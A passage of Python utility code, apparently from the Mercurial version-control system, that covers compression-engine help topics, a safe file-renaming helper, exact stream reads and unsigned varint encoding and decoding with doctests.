compengines.register(_zstdengine())

def bundlecompressiontopics():
    """Obtains a list of available bundle compressions for use in help."""
    # help.makeitemsdocs() expects a dict of names to items with a .__doc__.
    items = {}

    # We need to format the docstring. So use a dummy object/type to hold it
    # rather than mutating the original.
    class docobject(object):
        pass

    for name in compengines:
        engine = compengines[name]

        if not engine.available():
            continue

        bt = engine.bundletype()
        if not bt or not bt[0]:
            continue

        doc = b'``%s``\n    %s' % (bt[0], pycompat.getdoc(engine.bundletype))

        value = docobject()
        value.__doc__ = pycompat.sysstr(doc)
        value._origdoc = engine.bundletype.__doc__
        value._origfunc = engine.bundletype

        items[bt[0]] = value

    return items

i18nfunctions = bundlecompressiontopics().values()

# convenient shortcut
dst = debugstacktrace

def safename(f, tag, ctx, others=None):
    """
    Generate a name that it is safe to rename f to in the given context.

    f:      filename to rename
    tag:    a string tag that will be included in the new name
    ctx:    a context, in which the new name must not exist
    others: a set of other filenames that the new name must not be in

    Returns a file name of the form oldname~tag[~number] which does not exist
    in the provided context and is not in the set of other names.
    """
    if others is None:
        others = set()

    fn = '%s~%s' % (f, tag)
    if fn not in ctx and fn not in others:
        return fn
    for n in itertools.count(1):
        fn = '%s~%s~%s' % (f, tag, n)
        if fn not in ctx and fn not in others:
            return fn

def readexactly(stream, n):
    '''read n bytes from stream.read and abort if less was available'''
    s = stream.read(n)
    if len(s) < n:
        raise error.Abort(_("stream ended unexpectedly"
                           " (got %d bytes, expected %d)")
                          % (len(s), n))
    return s

def uvarintencode(value):
    """Encode an unsigned integer value to a varint.

    A varint is a variable length integer of 1 or more bytes. Each byte
    except the last has the most significant bit set. The lower 7 bits of
    each byte store the 2's complement representation, least significant group
    first.

    >>> uvarintencode(0)
    '\\x00'
    >>> uvarintencode(1)
    '\\x01'
    >>> uvarintencode(127)
    '\\x7f'
    >>> uvarintencode(1337)
    '\\xb9\\n'
    >>> uvarintencode(65536)
    '\\x80\\x80\\x04'
    >>> uvarintencode(-1)
    Traceback (most recent call last):
        ...
    ProgrammingError: negative value for uvarint: -1
    """
    if value < 0:
        raise error.ProgrammingError('negative value for uvarint: %d'
                                     % value)
    bits = value & 0x7f
    value >>= 7
    bytes = []
    while value:
        bytes.append(pycompat.bytechr(0x80 | bits))
        bits = value & 0x7f
        value >>= 7
    bytes.append(pycompat.bytechr(bits))

    return ''.join(bytes)

def uvarintdecodestream(fh):
    """Decode an unsigned variable length integer from a stream.

    The passed argument is anything that has a ``.read(N)`` method.

    >>> try:
    ...     from StringIO import StringIO as BytesIO
    ... except ImportError:
    ...     from io import BytesIO
    >>> uvarintdecodestream(BytesIO(b'\\x00'))
    0
    >>> uvarintdecodestream(BytesIO(b'\\x01'))
    1
    >>> uvarintdecodestream(BytesIO(b'\\x7f'))
    127
    >>> uvarintdecodestream(BytesIO(b'\\xb9\\n'))
    1337
    >>> uvarintdecodestream(BytesIO(b'\\x80\\x80\\x04'))
    65536
    >>> uvarintdecodestream(BytesIO(b'\\x80'))
    Traceback (most recent call last):
        ...
    Abort: stream ended unexpectedly (got 0 bytes, expected 1)
    """
    result = 0
    shift = 0
    while True:
        byte = ord(readexactly(fh, 1))
        result |= ((byte & 0x7f) << shift)
        if not (byte & 0x80):
            return result
        shift += 7
